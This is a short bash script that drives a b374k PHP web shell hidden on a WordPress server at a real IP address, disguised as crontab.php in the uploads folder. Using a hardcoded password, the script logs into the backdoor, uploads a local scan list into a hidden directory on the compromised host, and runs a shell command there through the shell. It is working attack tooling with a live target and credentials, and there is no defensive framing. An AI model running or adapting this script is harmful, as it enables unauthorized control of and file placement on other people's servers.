#!/bin/bash


readonly uploadfile="/media/zubat/SUNY/P2021/scan/list_clear.txt"
readonly webshell="http://104.236.35.97/blog/wp-content/uploads/crontab.php"
readonly password="mlcboard"
readonly rpath="tmp/.scan/"

#~ login
html=$(curl --location --user-agent "Firefox" --cookie-jar "b374k" --data "pass=$password" "$webshell")
if [[ "$html" == *"logout"* ]]; then
	echo "[status] login success!" |grep --color ".*"
else
	echo "[status] login failed!" |grep --color ".*"
	exit
fi
#~ cd
curl -L -A "Firefox" -b "b374k" -c "b374k" -d "cd=$rpath" "$webshell" -o /dev/null
#~ upload
curl -L -A "Firefox" -b "b374k" -o /dev/null -F "ulFile=@$uploadfile" -F "ulSaveTo=$rpath" -F "ulType=comp" "$webshell" -#

echo "[status] finsih!" |grep --color ".*"

#~ terminal ls dir
curl -L -A "Firefox" -b "b374k" -d "terminalInput=ls -l" "$webshell"

echo "[status] exit" |grep --color ".*"

rm b374k
